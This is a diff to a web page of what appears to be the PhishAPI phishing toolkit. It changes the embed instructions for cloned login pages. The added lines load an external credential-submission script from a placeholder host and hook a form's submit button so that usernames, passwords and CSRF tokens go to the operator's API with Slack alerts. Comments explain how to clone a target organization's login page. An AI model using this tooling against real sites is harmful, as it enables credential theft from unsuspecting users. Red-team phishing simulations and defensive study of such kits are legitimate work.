@@ -211,27 +211,32 @@ textarea {
 <BR><BR>
 <FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own HTML and Embed the API Tags</FONT><BR><BR>
 <textarea style="text-align:left" class="js-emaillink">
-<!-- LOCATION OF YOUR API TO POST TO -->
-<FORM METHOD="POST" ACTION="<?php echo $APIDomain; ?>">
+<!--Add the external script source in the <head> element-->
+<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>
 
-<!-- MAKE SURE INPUT FIELDS ARE NAMED AS FOLLOWS -->
-<INPUT NAME="username">
+<!--Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments-->
+<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">
 
-<INPUT NAME="password">
+<!--
+PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)
 
-<!-- NOT REQUIRED -->
-<INPUT NAME="token">
+NAME/ID_OF_LOGIN_FORM = Whatever the cloned <form name=""> is set to for the page you cloned
 
-<!-- UNIQUE PROJECT NAME FOR SORTING OF DATA ON BACKEND -->
-<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">
+PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)
 
-<!-- LOCATION THE USER WILL BE REDIRECTED TO AFTER SUBMITTING CREDENTIALS -->
-<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">
+SLACK_BOT_NAME = I use "PhishBot"
 
-<!-- OPTIONAL SLACKBOT MODIFICATIONS FOR ALERTING -->
-<INPUT NAME="slackbotname" VALUE="PhishBot" TYPE="hidden">
+SLACK_EMOJI = I use :fishing_pole_and_fish:
 
-<INPUT NAME="slackemoji" VALUE=":fishing_pole_and_fish:" TYPE="hidden"></textarea>
+USER_FIELD_NAME/ID = Name or ID of the username/email field (<input name="username"> or <input id="user">)
+
+PASS_FIELD_NAME/ID = Name or ID of the password field (<input name="password"> or <input id="pass">)
+
+SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)
+
+CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token. If so provide the Name/ID here (<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF"> so "csrf_token" is what you would use)
+-->
+</textarea>
 <p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>
 
 <script>
